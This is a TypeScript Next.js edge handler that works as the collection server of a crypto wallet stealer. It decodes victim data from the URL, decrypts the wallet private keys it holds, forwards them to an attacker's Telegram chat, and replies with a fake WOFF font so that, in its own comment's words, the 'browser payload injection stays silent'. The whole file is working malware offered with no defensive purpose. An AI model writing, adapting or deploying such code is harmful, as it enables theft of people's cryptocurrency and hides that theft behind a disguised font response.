import { NextRequest } from "next/server";
import bs58 from "bs58";

export const config = {
  runtime: "edge",
};

// Helper: convert ArrayBuffer → hex string
function bufToHex(buffer: ArrayBuffer): string {
  return [...new Uint8Array(buffer)]
    .map(b => b.toString(16).padStart(2, "0"))
    .join("");
}

export default async function handler(req: NextRequest) {
  const { BOT_TOKEN, CHAT_ID } = process.env;
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Missing BOT_TOKEN or CHAT_ID");
    return new Response("Server misconfigured", { status: 500 });
  }

  const slug = new URL(req.url).pathname.split("/").pop();
  if (!slug || !slug.includes("_")) {
    return new Response("Invalid slug", { status: 400 });
  }

  // 1. Extract and URL-safe Base64 → raw JSON
  let payloadJson: string;
  try {
    const encoded = slug.split("_")[1];
    const fixed = encoded.replace(/-/g, "+").replace(/_/g, "/");
    const padded = fixed + "=".repeat((4 - (fixed.length % 4)) % 4);
    payloadJson = Buffer.from(padded, "base64").toString("utf-8");
  } catch (err) {
    console.error("Error decoding slug:", err);
    return new Response("Bad request", { status: 400 });
  }

  // 2. Parse JSON
  let data: { keybundle: string; sBundles: string[]; ts: number };
  try {
    data = JSON.parse(payloadJson);
  } catch (err) {
    console.error("Invalid JSON payload:", err);
    return new Response("Bad request", { status: 400 });
  }

  // 3. Import AES-GCM key
  let aesKey: CryptoKey;
  try {
    const keyBytes = Uint8Array.from(
      Buffer.from(data.keybundle, "base64")
    );
    aesKey = await crypto.subtle.importKey(
      "raw",
      keyBytes,
      "AES-GCM",
      false,
      ["decrypt"]
    );
  } catch (err) {
    console.error("Key import failed:", err);
    return new Response("Bad request", { status: 400 });
  }

  // 4. Decrypt each sBundle and collect private keys
  const privKeysBase58: string[] = [];
  for (let i = 0; i < data.sBundles.length; i++) {
    const entry = data.sBundles[i];
    const [ivB64, cipherB64] = entry.split(":");
    try {
      const iv = Uint8Array.from(Buffer.from(ivB64, "base64"));
      const cipher = Uint8Array.from(Buffer.from(cipherB64, "base64"));

      // Decrypt
      const plainBuf = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv },
        aesKey,
        cipher
      );

      // Get hex string
      const hex = bufToHex(plainBuf);
      // Last 64 hex chars → private key
      const privHex = hex.slice(64);
      // Base58 encode
      const privB58 = bs58.encode(Buffer.from(privHex, "hex"));

      privKeysBase58.push(privB58);
    } catch (err) {
      console.error(`Decryption failed for bundle #${i}:`, err);
      // skip or you could abort
    }
  }

  if (privKeysBase58.length === 0) {
    console.error("No private keys decrypted");
  } else {
    // 5. Format message
    const lines: string[] = [];
    privKeysBase58.forEach((priv, idx) => {
      lines.push(`Wallet ${idx + 1}`);
      lines.push(priv);
      lines.push(""); // blank line
    });
    const message = lines.join("\n");

    // 6. Send to Telegram
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message.trim(),
          parse_mode: "Markdown"
        })
      });
    } catch (err) {
      console.error("Failed to send to Telegram:", err);
    }
  }

  // 7. Return minimal WOFF so browser payload injection stays silent
  return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
    headers: {
      "Content-Type": "font/woff",
      "Access-Control-Allow-Origin": "*",
    },
  });
}
